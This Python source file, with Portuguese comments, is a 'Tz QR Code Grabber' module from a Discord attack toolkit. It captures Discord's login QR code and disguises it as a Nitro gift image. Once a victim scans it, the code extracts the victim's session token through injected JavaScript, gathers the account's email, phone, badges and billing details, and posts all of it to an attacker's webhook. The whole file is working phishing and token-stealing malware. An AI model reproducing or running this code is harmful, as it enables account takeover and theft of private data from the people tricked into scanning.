# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).


import os
import sys
import json
import base64
import Tz
import requests

from PIL import Image
from zipfile import ZipFile
from time import sleep
from urllib.request import urlretrieve
from selenium import webdriver, common
from bs4 import BeautifulSoup
from colorama import Fore

from util.plugins.common import getDriver, getheaders, SlowPrint

def logo_qr():
    #Cole o logotipo do discord no código QR
    im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im1.paste(im2, (60, 55), im2)
    im1.save('QR-Code/Qr_Code.png', quality=95)

def paste_template():
    #cole o código QR finalizado no modelo nitro
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/Qr_Code.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('QR-Code/discord_gift.png', quality=95)

def QR_Grabber(Webhook):
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Digite qualquer coisa para continuar. . . ")
            input()
            Tz.main()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Digite qualquer coisa para continuar. . . ")
            input()
            Tz.main()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"Digite qualquer coisa para continuar. . .")
            input()
            Tz.main()
    else:
        print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Não foi possível encontrar um driver para criar um código QR com')
        sleep(3)
        print("Digite qualquer coisa para continuar. . . ", end="")
        input()
        Tz.main()

    driver.get('https://discord.com/login') #obter url de discórdia para que possamos registrar o token
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    #Crie o código QR
    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    print(f"\n{Fore.WHITE}Download de modelos de código QR")

    #Baixe modelos de código QR
    urlretrieve(
        "https://github.com/Tzpuao/injection/blob/main/QR-Code.zip?raw=true",
        filename="QR-Code.zip",
    )
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    #removedor de modelos
    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")

    print(f'\nQR Code gerado em '+os.getcwd()+"\\QR-Code")
    print(f'\n{Fore.RED}Certifique-se de ter esta janela aberta para pegar seu token!{Fore.RESET}')
    print(f'{Fore.MAGENTA}Envie o QR Code para um usuário e espere que ele escaneie!{Fore.RESET}')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    if sys.argv[0].endswith(".exe"):
        print(f'\nAbrindo um novo TzNuker para que você possa continuar usando enquanto este registra o código QR!\nSinta-se à vontade para minimizar esta janela{Fore.RESET}')
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    #Esperando que eles escaneiem o código QR    
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "Nenhum número de telefone anexado"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

            embed = {
                "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
                "embeds": [
                    {
                        "author": {
                            "name": "Tz QR Code Grabber",
                            "url": "https://instagram.com;tzfofo",
                            "icon_url": "https://cdn.discordapp.com/attachments/933445384859156550/942688091519471636/Tz.gif"
                        },
                        "description": f"**{user}** Acabei de escanear o código QR\n\n**Faturamento:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Telefone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```fix\n{token}```",
                              "inline": False
                            }
                        ],
                        "color": 8388736,

                        "footer": {
                          "text": "©Tz https://instagram.com/tzfofo"
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            break
    os._exit(0)
